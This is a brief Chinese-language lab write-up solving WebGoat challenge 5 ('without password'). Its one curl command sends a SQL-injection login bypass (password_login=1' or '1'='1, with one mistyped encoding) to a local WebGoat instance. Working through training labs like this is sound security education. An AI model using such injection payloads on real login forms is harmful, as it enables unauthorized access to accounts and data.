# without password

就是一个注入题

构造下面请求即可。

```
curl -vn -H "Cookie: JSESSIONID=574A15072CE7BA353B3CF93D8AE1AB92" -d "username_login=Larry&password_login=1'%20or$20'1'='1" 127.0.0.1:8080/WebGoat/challenge/5
```